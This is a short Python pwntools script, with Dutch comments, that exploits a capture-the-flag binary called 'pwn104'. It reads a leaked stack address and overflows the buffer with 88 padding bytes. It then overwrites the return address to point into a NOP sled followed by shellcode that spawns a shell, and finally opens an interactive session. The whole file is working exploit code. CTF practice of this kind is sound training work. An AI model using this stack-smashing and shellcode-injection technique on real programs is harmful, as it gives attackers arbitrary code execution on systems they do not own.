from pwn import *
import time

# test 2
r = process('./pwn104-1644300377109.pwn104')
#r = remote("127.0.0.1", 9004)

# creeer shellcode 
context.update(arch="amd64", os="linux")
buf = asm(shellcraft.sh())

answ = r.recvuntil(b'waiting for you at ')
addr = r.recvline()
hexaddr = int(addr, 16)
# andere offset dan begin buffer
hexaddr = hexaddr + 96
print("Het adres is: %s" % str(addr))

# offset lengte 80
payload = b"A"*80
payload += b"B"*8
payload += p64(hexaddr, endian='little')
payload += b"\x90"*20
payload += buf

# # Schrijf naar bestand voor gebruik in gdbscript
with open("input.txt", "wb") as filp:
	filp.write(payload)

r.sendline(payload)
r.interactive()
